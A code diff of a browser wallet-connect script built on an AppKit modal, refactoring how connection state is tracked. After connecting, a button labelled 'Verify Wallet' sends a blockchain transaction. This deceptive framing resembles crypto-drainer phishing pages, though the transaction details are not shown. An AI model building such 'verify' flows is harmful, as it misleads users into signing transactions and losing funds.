@@ -24,8 +24,6 @@ const modal = createAppKit({
 const actionBtn = document.getElementById("action-btn");
 const pageLoader = document.getElementById("page-loader");
 
-let connected = false;
-
 // Toast
 function showToast(message, type = "info") {
   const toast = document.createElement("div");
@@ -47,31 +45,20 @@ function setButtonState(state, text = "") {
   if (text) actionBtn.textContent = text;
 }
 
-// Modal State Tracking
-modal.subscribeProviders((state) => {
-  const { isConnected, address } = state;
-  connected = isConnected;
-
-  if (isConnected && address) {
-    actionBtn.textContent = "Verify Wallet";
-    showToast(`Connected: ${address}`, "success");
-  } else {
-    actionBtn.textContent = "Connect Wallet";
-    showToast("Wallet disconnected", "warning");
-  }
-});
-
 // Button Click Handler
 actionBtn.addEventListener("click", async () => {
-  if (!connected) {
-    // Connect Wallet
+  const address = modal.getAddress?.();
+
+  if (!address) {
+    // Not connected: open wallet modal
     try {
       setButtonState(true, "Connecting...");
       await modal.open();
 
-      const address = modal.getAddress?.();
-      if (address) {
-        showToast(`Connected: ${address}`, "success");
+      const newAddress = modal.getAddress?.();
+      if (newAddress) {
+        showToast(`Connected: ${newAddress}`, "success");
+        actionBtn.textContent = "Verify Wallet";
       } else {
         showToast("Connection failed", "error");
       }
@@ -82,7 +69,7 @@ actionBtn.addEventListener("click", async () => {
       setButtonState(false, "Verify Wallet");
     }
   } else {
-    // Send TX
+    // Already connected: send transaction
     try {
       setButtonState(true, "Sending...");
       await sendTransaction();
@@ -116,3 +103,15 @@ async function sendTransaction() {
   showToast("✅ Transaction sent!", "success");
   console.log("✅ TX Hash:", tx.hash);
 }
+
+// Optional: Update button state on wallet events
+modal.subscribeProviders((state) => {
+  const { isConnected, address } = state;
+  if (isConnected && address) {
+    actionBtn.textContent = "Verify Wallet";
+    showToast(`Connected: ${address}`, "success");
+  } else {
+    actionBtn.textContent = "Connect Wallet";
+    showToast("Wallet disconnected", "warning");
+  }
+});
